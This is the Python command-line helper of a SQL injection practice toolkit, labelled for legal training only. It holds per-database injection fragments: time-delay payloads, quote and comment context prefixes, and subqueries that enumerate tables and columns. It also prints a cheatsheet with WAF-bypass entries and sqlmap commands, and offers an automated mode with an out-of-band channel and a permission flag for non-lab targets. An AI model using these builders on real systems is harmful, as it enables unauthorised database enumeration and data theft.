#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Interactive walkthrough + auto mode for SQL injection practice.

Auto mode:
    python -m sqli_toolkit.helper --auto <folder> [--debug] [--fast]
"""

import sys
from typing import Optional

from .cheatsheet import (
    FINGERPRINT, SESSION_INFO, COMMENT_SYNTAX, CONCAT_SYNTAX,
    SUBSTR_SYNTAX, LENGTH_SYNTAX, SLEEP_SYNTAX, HEAVY_QUERY,
    TABLES_QUERY, COLUMNS_QUERY, INFO_SCHEMA_ALTERNATIVES,
    ERROR_BASED, WAF_BYPASS, STRING_REPR, MYSQL_TRICKS,
    SQLMAP_CMDS,
)
from .union_builder import UnionBuilder
from .pack_builder import NumType, sql_pack_expr


LINE_WIDTH = 68


DIALECT = {
    "mysql": {
        "title": "MySQL", "comment": "-- ", "schema": "database()",
        "db_name": "database()", "current_user": "current_user()",
        "version": "@@version", "substr": "SUBSTRING", "ascii": "ASCII",
        "length": "LENGTH", "concat": "CONCAT", "sleep": "SLEEP(5)",
        "tables_from": "information_schema.tables",
        "tables_where": "table_schema=database()",
        "cols_from": "information_schema.columns",
        "cols_where": "table_name='{t}'",
        "limit1": "LIMIT 1 OFFSET {o}",
    },
    "postgres": {
        "title": "PostgreSQL", "comment": "-- ", "schema": "current_schema()",
        "db_name": "current_database()", "current_user": "current_user",
        "version": "version()", "substr": "SUBSTRING", "ascii": "ASCII",
        "length": "LENGTH", "concat": "CONCAT", "sleep": "pg_sleep(5)",
        "tables_from": "information_schema.tables",
        "tables_where": "table_schema=current_schema()",
        "cols_from": "information_schema.columns",
        "cols_where": "table_name='{t}'",
        "limit1": "LIMIT 1 OFFSET {o}",
    },
    "mssql": {
        "title": "MSSQL", "comment": "-- ", "schema": "SCHEMA_NAME()",
        "db_name": "DB_NAME()", "current_user": "SUSER_NAME()",
        "version": "@@version", "substr": "SUBSTRING", "ascii": "ASCII",
        "length": "LEN", "concat": "CONCAT", "sleep": "WAITFOR DELAY '0:0:5'",
        "tables_from": "information_schema.tables",
        "tables_where": "1=1",
        "cols_from": "information_schema.columns",
        "cols_where": "table_name='{t}'",
        "limit1": "ORDER BY (SELECT NULL) OFFSET {o} ROWS FETCH NEXT 1 ROWS ONLY",
    },
    "oracle": {
        "title": "Oracle", "comment": "-- ",
        "schema": "SYS_CONTEXT('USERENV','CURRENT_SCHEMA')",
        "db_name": "ora_database_name", "current_user": "USER",
        "version": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
        "substr": "SUBSTR", "ascii": "ASCII", "length": "LENGTH",
        "concat": "CONCAT", "sleep": "dbms_pipe.receive_message(('a'),5)",
        "tables_from": "user_tables",
        "tables_where": "1=1",
        "cols_from": "user_tab_columns",
        "cols_where": "table_name='{t}'",
        "limit1": "OFFSET {o} ROWS FETCH NEXT 1 ROWS ONLY",
    },
    "sqlite": {
        "title": "SQLite", "comment": "-- ", "schema": "''",
        "db_name": "''", "current_user": "''",
        "version": "sqlite_version()", "substr": "SUBSTR",
        "ascii": "UNICODE", "length": "LENGTH", "concat": "||",
        "sleep": "(SELECT 1 FROM (SELECT 1) WHERE 1=randomblob(100000000))",
        "tables_from": "sqlite_master",
        "tables_where": "type='table'",
        "cols_from": "pragma_table_info('{t}')",
        "cols_where": "1=1",
        "limit1": "LIMIT 1 OFFSET {o}",
    },
}


def D(db: str) -> dict:
    return DIALECT.get(db, DIALECT["mysql"])


def db_title(db: str) -> str:
    return D(db)["title"]


def comment(db: str) -> str:
    return D(db)["comment"]


def sleep_expr(db: str) -> str:
    return D(db)["sleep"]


def subquery_tables(db: str, offset: int = 0) -> str:
    d = D(db)
    if db == "oracle":
        return f"(SELECT table_name FROM user_tables WHERE ROWNUM={offset + 1})"
    if db == "mssql":
        lim = f"ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
    else:
        lim = d["limit1"].format(o=offset)
    return (f"(SELECT table_name FROM {d['tables_from']} "
            f"WHERE {d['tables_where']} ORDER BY table_name {lim})")


def subquery_cols(db: str, table: str, offset: int = 0) -> str:
    d = D(db)
    if db == "sqlite":
        lim = d["limit1"].format(o=offset)
        return (f"(SELECT name FROM pragma_table_info('{table}') "
                f"ORDER BY name {lim})")
    if db == "oracle":
        return (f"(SELECT column_name FROM user_tab_columns "
                f"WHERE table_name='{table.upper()}' "
                f"ORDER BY column_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)")
    lim = d["limit1"].format(o=offset)
    return (f"(SELECT column_name FROM {d['cols_from']} "
            f"WHERE {d['cols_where'].format(t=table)} "
            f"ORDER BY column_name {lim})")


def context_prefix(context: str) -> str:
    if context == "numeric":
        return "1"
    if context == "like":
        return "%'"
    return "'"


def add_clause(payload: str, clause: str) -> str:
    for c in ("-- -", "-- "):
        if c in payload:
            head, _ = payload.rsplit(c, 1)
            return f"{head.rstrip()} {clause}{c}"
    return f"{payload.rstrip()} {clause}"


def hr(c: str = "-", n: int = LINE_WIDTH) -> None:
    print(c * n)


def title(t: str) -> None:
    hr("=")
    print(f"  {t}")
    hr("=")


def sec(t: str) -> None:
    print()
    hr()
    print(f"  {t}")
    hr()


def hint(t: str) -> None:
    print(f"  hint : {t}")


def pay(t: str) -> None:
    print(f"  -->  {t}")


def note(t: str) -> None:
    print(f"  * {t}")


def ask(prompt: str, options: dict) -> str:
    for k, (label, _) in options.items():
        print(f"    [{k}] {label}")
    while True:
        try:
            ans = input(f"  {prompt}: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        if ans in options:
            return options[ans][1]
        print("  ! invalid choice.")


def ask_int(prompt: str, lo: int = 1, hi: int = 30) -> int:
    while True:
        try:
            n = int(input(f"  {prompt} [{lo}-{hi}]: ").strip())
            if lo <= n <= hi:
                return n
        except ValueError:
            pass
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        print(f"  ! enter a number {lo}-{hi}.")


def ask_str(prompt: str, default: str = "") -> str:
    try:
        ans = input(f"  {prompt}" + (f" [{default}]: " if default else ": ")).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)
    return ans or default


def pick_db() -> str:
    return ask("Which DBMS?", {
        "1": ("MySQL / MariaDB", "mysql"),
        "2": ("MSSQL",           "mssql"),
        "3": ("PostgreSQL",      "postgres"),
        "4": ("Oracle",          "oracle"),
        "5": ("SQLite",          "sqlite"),
        "6": ("Unknown",         "unknown"),
    })


def show_map(name: str, mapping: dict) -> None:
    sec(name)
    w = max(len(str(k)) for k in mapping)
    for k, v in mapping.items():
        print(f"  {str(k):<{w}} : {v}")


def show_sleep(db: str) -> None:
    show_map("Sleep (time-based)", {"Payload": sleep_expr(db)})
    show_map("Heavy query (if sleep is blocked)",
             {"Payload": HEAVY_QUERY[db_title(db)]})


def show_full_cheatsheet() -> None:
    title("Final cheatsheet")
    show_map("Fingerprint", FINGERPRINT)
    show_map("Session", SESSION_INFO)
    show_map("Comments", COMMENT_SYNTAX)
    show_map("Concatenation", CONCAT_SYNTAX)
    show_map("Substring", SUBSTR_SYNTAX)
    show_map("Length", LENGTH_SYNTAX)
    show_map("Sleep", SLEEP_SYNTAX)
    show_map("Tables query", TABLES_QUERY)
    show_map("Columns query", COLUMNS_QUERY)
    show_map("information_schema alternatives", INFO_SCHEMA_ALTERNATIVES)
    show_map("Error-based", ERROR_BASED)
    show_map("WAF bypass", WAF_BYPASS)
    show_map("Strings", STRING_REPR)
    print("\n== sqlmap ==")
    for name, cmd in SQLMAP_CMDS:
        print(f"  {name:<22} {cmd}")


def run() -> None:
    title("SQLi Helper (manual)")
    print("  Auto mode:")
    print("    python -m sqli_toolkit.helper --auto <folder> "
          "[--debug] [--fast]")
    print()
    print("  Manual mode is not the focus here. Cheatsheet:")
    print("    python -m sqli_toolkit.cheatsheet")
    print()
    show_full_cheatsheet()


def _load_settings_json(campaign_dir):
    import json
    from pathlib import Path
    p = Path(campaign_dir).expanduser().resolve() / "settings.json"
    if not p.exists():
        return {}
    try:
        return json.loads(p.read_text(encoding="utf-8")) or {}
    except Exception as e:
        print(f"  !! settings.json parse error: {e!r}")
        return {}


def _explicit_flags(args) -> set:
    """Return the set of flag names the user passed on the CLI.

    We detect this by comparing to sentinel None.  All numeric CLI
    flags use default=None so 'None' means 'not passed'.
    """
    explicit = set()
    for name in ("rps", "max_rps", "parallel", "delay", "timeout",
                 "max_total", "retries", "no_throttle",
                 "oob_domain", "oob_wait"):
        if getattr(args, name, None) is not None:
            explicit.add(name)
    # --no-throttle is store_true: if True, treat as explicit
    if getattr(args, "no_throttle", False):
        explicit.add("no_throttle")
    return explicit


def build_config_from_args(args) -> "Config":
    from .config import Config

    # 1) read settings.json BEFORE constructing Config
    settings = _load_settings_json(args.auto) if args.auto else {}
    if settings:
        print(f"  settings:  loaded settings.json: {settings}")

    # 2) construct Config with user-explicit values or None
    #    (None means 'fall back to settings.json, then to default')
    cfg = Config(
        campaign_dir=args.auto,
        permission_granted=bool(args.i_have_permission),
        delay=args.delay,
        debug=args.debug,
        fast=args.fast,
        scan_all=args.scan_all,
        non_interactive=args.non_interactive,
        parallel=args.parallel,
        max_rps=args.rps if args.rps is not None else args.max_rps,
        max_total=args.max_total,
        timeout=args.timeout,
        no_throttle=args.no_throttle,
        retries=args.retries,
        quiet=args.quiet,
        json_out=args.json_out,
        oob_domain=args.oob_domain,
        oob_wait=getattr(args, "oob_wait", None),
        channel=(getattr(args, "channel", None) or "auto"),
    )

    # 3) merge settings.json into cfg, respecting explicit CLI
    explicit = _explicit_flags(args)
    cfg.merge_settings(settings, explicit=explicit)
    cfg.apply_safe_defaults()
    return cfg


def main() -> None:
    import argparse
    from .config import DISCLAIMER

    ap = argparse.ArgumentParser(
        description="SQLi Helper — for legal training only",
    )
    ap.add_argument("--auto", metavar="DIR",
                    help="folder with request.txt / match.txt / words.txt")
    ap.add_argument("--delay", type=int, default=None,
                    help="time-based delay in seconds (default: 5)")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--debug", action="store_true",
                    help="write full trace to <campaign>/debug/trace.log")
    ap.add_argument("--fast", action="store_true",
                    help="use lo=32 for printable ASCII")
    ap.add_argument("--scan-all", action="store_true",
                    help="do not stop on first point; report all hits")
    ap.add_argument("--non-interactive", action="store_true",
                    help="auto-boolean picks a marker without prompting")
    ap.add_argument("--auto-marker", dest="non_interactive",
                    action="store_true",
                    help="alias for --non-interactive")
    ap.add_argument("--channel", default=None,
                    help="comma-separated channel list: "
                         "error,boolean,time,union,oob (default: auto)")
    ap.add_argument("--parallel", type=int, default=None,
                    help="number of parallel worker threads (1=off)")
    ap.add_argument("--rps", type=float, default=None,
                    help="max requests per second (hard-capped at 10)")
    ap.add_argument("--max-rps", type=float, default=None,
                    help="alias for --rps; hard-capped at 10")
    ap.add_argument("--max-total", type=int, default=None,
                    help="stop after N requests total (0=unlimited)")
    ap.add_argument("--retries", type=int, default=None,
                    help="HTTP retries per request (default: 3)")
    ap.add_argument("--timeout", type=int, default=None,
                    help="HTTP timeout in seconds (default: 30)")
    ap.add_argument("--no-throttle", action="store_true",
                    help="ignore settings.json rps")
    ap.add_argument("--quiet", action="store_true",
                    help="only print the final result")
    ap.add_argument("--json", dest="json_out", action="store_true",
                    help="machine-readable output (reserved)")
    ap.add_argument("--oob-domain", default=None,
                    help="collaborator domain for OOB channel")
    ap.add_argument("--oob-wait", type=int, default=None,
                    help="seconds to wait for OOB callback (default: 30)")
    ap.add_argument("--i-have-permission", action="store_true",
                    help="allow non-lab targets (implies written auth)")
    args = ap.parse_args()

    if not args.quiet:
        print(DISCLAIMER)

    try:
        if args.auto:
            from .auto import run_auto
            cfg = build_config_from_args(args)
            run_auto(cfg, dry_run=args.dry_run)
            return
        run()
    except (KeyboardInterrupt, EOFError):
        print("\n  Interrupted.")
        sys.exit(0)


if __name__ == "__main__":
    main()
